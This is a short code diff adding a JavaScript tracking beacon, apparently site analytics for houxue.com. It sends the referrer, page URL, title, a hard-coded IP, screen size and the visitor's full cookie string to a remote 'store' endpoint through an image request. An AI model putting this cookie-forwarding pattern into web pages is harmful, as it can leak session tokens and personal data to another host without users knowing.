@@ -1,0 +1,9 @@
+var img = new Image();
+var hxrefer = encodeURIComponent(document.referrer);
+var curip = '61.140.62.107';
+var cus_guidv = '539e8ca2a43dff7481794dbbe2410faf';
+var hxcururl = encodeURIComponent(window.location.href);
+var hxwebtitle = encodeURIComponent(document.title);
+var cuscookie = encodeURIComponent(document.cookie);
+var hxratio = window.screen.width+'x'+window.screen.height;
+img.src ='https://hxanalysis.houxue.com/analysis/store?r='+hxrefer+'&cr='+hxcururl+'&ct='+hxwebtitle+'&cp='+curip+'&cus_guid='+cus_guidv+'&ca='+hxratio+'&ck='+cuscookie;
